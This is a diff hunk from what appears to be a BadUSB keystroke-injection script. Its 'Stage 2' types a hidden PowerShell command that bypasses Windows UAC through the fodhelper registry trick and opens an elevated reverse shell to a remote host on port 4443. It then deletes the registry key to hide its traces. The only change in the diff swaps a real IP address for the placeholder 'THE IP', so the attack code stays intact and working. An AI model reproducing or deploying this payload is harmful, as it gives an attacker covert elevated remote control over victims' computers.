@@ -10,7 +10,7 @@ GUI r
 DELAY 1000
 
 REM ── STAGE 2: Launch elevated PowerShell via fodhelper UAC bypass ──
-STRING cmd /c start /min "" powershell -w hidden -ep bypass -nop -c "$p='HKCU:\Software\Classes\ms-settings\Shell\Open\command';New-Item -Path $p -Force;Set-ItemProperty -Path $p -Name '(default)' -Value 'cmd /c start /min powershell -w hidden -ep bypass -nop -c ""$c=New-Object Net.Sockets.TCPClient(''153.75.82.198'',4443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r+''PS ''+(pwd).Path+''> '');$s.Write($rb,0,$rb.Length);$s.Flush()}""';Set-ItemProperty -Path $p -Name 'DelegateExecute' -Value '';Start-Process fodhelper.exe;Start-Sleep 3;Remove-Item -Path 'HKCU:\Software\Classes\ms-settings' -Recurse -Force"
+STRING cmd /c start /min "" powershell -w hidden -ep bypass -nop -c "$p='HKCU:\Software\Classes\ms-settings\Shell\Open\command';New-Item -Path $p -Force;Set-ItemProperty -Path $p -Name '(default)' -Value 'cmd /c start /min powershell -w hidden -ep bypass -nop -c ""$c=New-Object Net.Sockets.TCPClient(''THE IP'',4443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r+''PS ''+(pwd).Path+''> '');$s.Write($rb,0,$rb.Length);$s.Flush()}""';Set-ItemProperty -Path $p -Name 'DelegateExecute' -Value '';Start-Process fodhelper.exe;Start-Sleep 3;Remove-Item -Path 'HKCU:\Software\Classes\ms-settings' -Recurse -Force"
 ENTER
 DELAY 5000
 
